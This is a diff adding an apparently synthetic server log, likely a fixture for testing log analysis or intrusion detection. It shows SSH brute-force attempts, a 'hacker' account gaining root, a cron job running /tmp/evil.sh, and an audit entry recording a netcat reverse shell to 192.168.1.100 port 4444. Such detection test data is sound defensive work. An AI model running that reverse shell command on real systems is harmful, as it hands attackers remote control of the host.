@@ -1,0 +1,15 @@
+Dec  9 10:15:23 webserver01 sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
+Dec  9 10:15:24 webserver01 sshd[12345]: Failed password for admin from 192.168.1.100 port 22 ssh2
+Dec  9 10:15:25 webserver01 sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
+Dec  9 10:15:26 webserver01 sudo: hacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Dec  9 10:15:27 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC=192.168.1.100 DST=192.168.1.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 PROTO=TCP SPT=54321 DPT=3389 WINDOW=5840 RES=0x00 SYN URGP=0
+Dec  9 10:15:28 webserver01 systemd[1]: nginx.service: Main process exited, code=killed, status=9/KILL
+Dec  9 10:15:29 webserver01 kernel: Out of memory: Kill process 12345 (apache2) score 950 or sacrifice child
+Dec  9 10:15:30 webserver01 audit[12345]: USER_CMD pid=12345 uid=1000 auid=1000 ses=1 msg='cwd="/tmp" cmd="nc -e /bin/bash 192.168.1.100 4444" terminal=pts/0 res=success'
+Dec  9 10:15:31 webserver01 cron[12345]: (root) CMD (/tmp/evil.sh)
+Dec  9 10:15:32 webserver01 systemd[1]: Starting Suspicious Service...
+Dec  9 10:16:01 webserver01 sshd[12346]: Accepted password for user01 from 10.0.0.50 port 22 ssh2
+Dec  9 10:16:02 webserver01 sudo: user01 : TTY=pts/0 ; PWD=/home/user01 ; USER=root ; COMMAND=/usr/bin/apt update
+Dec  9 10:16:03 webserver01 kernel: [UFW ALLOW] IN=eth0 OUT= SRC=10.0.0.50 DST=192.168.1.1 PROTO=TCP DPT=443
+Dec  9 10:16:04 webserver01 audit[12347]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=7ffd1234 a1=7ffd5678 items=2 ppid=1 pid=12347 comm="bash" exe="/bin/bash" key="susp_activity"
+Dec  9 10:16:05 webserver01 sshd[12348]: Failed password for invalid user admin from 192.168.1.100 port 22 ssh2
